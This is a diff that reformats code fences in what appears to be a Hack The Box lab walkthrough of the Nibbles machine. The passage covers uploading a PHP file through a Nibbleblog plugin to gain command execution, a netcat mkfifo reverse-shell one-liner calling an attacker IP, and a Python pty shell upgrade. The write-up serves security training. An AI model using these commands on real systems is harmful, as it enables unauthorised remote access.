@@ -19,8 +19,7 @@ Attempting to make a new page and embed code or upload files does not seem like 
 
 Let us attempt to use this plugin to upload a snippet of `PHP` code instead of an image. The following snippet can be used to test for code execution.
 
-```
-        php
+```php
 <?php system('id'); ?>
 ```
 
@@ -30,8 +29,7 @@ Save this code to a file and then click on the `Browse` button and upload it.
 
 We get a bunch of errors, but it seems like the file may have uploaded.
 
-```
-        shellsession
+```shellsession
 Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
 
 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
@@ -47,8 +45,7 @@ Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /va
 
 Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
@@ -60,22 +57,19 @@ Let us edit our local PHP file and upload it again. This command should get us a
 
 Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.
 
-```
-        shellsession
+```shellsession
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f
 ```
 
 We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
 
-```
-        php
+```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
 ```
 
 We upload the file again and start a `netcat` listener in our terminal:
 
-```
-        shellsession
+```shellsession
 0xdf@htb[/htb]$ nc -lvnp 9443
 
 listening on [any] 9443 ...
@@ -83,8 +77,7 @@ listening on [any] 9443 ...
 
 `cURL` the image page again or browse to it in `Firefox` at <http://nibbleblog/content/private/plugins/my_image/image.php> to execute the reverse shell.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]]$ nc -lvnp 9443
 
 listening on [any] 9443 ...
@@ -97,15 +90,13 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 
 Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
 
-```
-        bash
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as `Python2` seems to be missing from the system!
 
-```
-        shellsession
+```shellsession
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 
 /bin/sh: 3: python: not found
@@ -117,8 +108,7 @@ $ which python3
 
 We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
 
-```
-        shellsession
+```shellsession
 nibbler@Nibbles:/home/nibbler$ ls
 
 ls
